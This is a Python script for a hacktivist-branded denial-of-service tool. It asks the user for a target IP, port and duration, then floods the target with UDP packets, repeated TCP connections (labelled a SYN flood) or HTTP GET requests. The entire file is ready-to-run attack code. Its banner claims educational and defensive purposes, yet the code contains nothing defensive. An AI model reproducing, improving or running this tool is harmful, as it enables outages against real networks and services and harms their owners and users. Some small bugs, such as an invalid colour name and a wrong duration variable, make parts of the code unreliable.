from termcolor import colored
import sys
import os
import time
import socket
import random

# Clear the terminal
os.system("clear")
os.system("figlet NurmanZegA")


print()
print(colored("Author   : TL 'Twin lion' Base_Nai", 'green'))
print(colored("Community Hacktivis : Brigade Al Aqsa", 'magenta'))
print(colored("Team   : BASE_NAI", 'red'))
print(colored("Owner  : Pejuang Kehidupan 'Nurman ZegA' Nitizen Attacker Indonesia",'red'))
print(colored("This tool was developed for educational and research purposes, as well as to assist defense teams in analyzing and investigating similar attacks.", 'cyan'))
print(colored("You are using NurmanZegA Version: 2.0", 'yellow'))
print()


# Prompt for target IP and port
ip = input("Enter the target IP: ")
try:
    port = int(input("Enter the target port: "))
except ValueError:
    print("Invalid port. Exiting...")
    sys.exit()

# Prompt for attack duration
try:
    dur = int(input("Enter the duration of the attack in seconds: "))
except ValueError:
    print("Invalid duration. Exiting...")
    sys.exit()

# Function to perform the UDP Flood attack


def udp_flood(ip, port, message, dur):
    # Create the UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Set a timeout for the socket so that the program doesn't get stuck
    s.settimeout(dur)

    # The IP address and port number of the target host
    target = (ip, port)

    # Start sending packets
    start_time = time.time()
    packet_count = 0
    while True:
        # Send the message to the target host
        try:
            s.sendto(message, target)
            packet_count += 1
            print(f"Sent packet ZegA{packet_count}")
        except socket.error:
            # If the socket is not able to send the packet, break the loop
            break

        # If the specified duration has passed, break the loop
        if time.time() - start_time >= dur:
            break

    # Close the socket
    s.close()

# Function to perform the SYN Flood attack
def syn_flood(ip, port, duration):
    sent = 0
    timeout = time.time() + int(duration)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sent += 1
            print(f"ZegA-Syn_flood Packets sent: {sent} to target: {ip}")
            sock.close()
        except OSError:
            pass
        except KeyboardInterrupt:
            print("\n[*] Attack stopped.")
            sys.exit()
        finally:
            sock.close()  # Make sure to close the socket in all cases 
# Function to perform the HTTP Flood attack

def http_flood(ip, port, duration):
    # create a socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # create HTTP request
    http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"

    sent = 0
    timeout = time.time() + int(dur)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            # Re-create the socket for each iteration
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendall(http_request)
            sent += 1
            print(f"ZegA_HTTP Packets sent: {sent} to target: {ip}")
        except KeyboardInterrupt:
            print("\n[-] Attack stopped by user")
            break
    sock.close()


# Prompt for the type of attack
attack_type = input(colored(
    "Enter the type of attack (Choose Number) (1.UDP/2.HTTP/3.SYN): ", "green"))

if attack_type == "1":
    message = b"Sending 1337 packets baby"
    print(colored("UDP attack selected", "red"))
    udp_flood(ip, port, message, dur)
    print(colored("UDP attack completed", "yellow"))
elif attack_type == "3":
    print(colored("SYN attack selected", "blue"))
    syn_flood(ip, port, dur)
elif attack_type == "2":
    print(colored("HTTP attack selected", "purple"))
    http_flood(ip, port, dur)
else:
    print(colored("Invalid attack type. Exiting...", "red"))
    sys.exit()
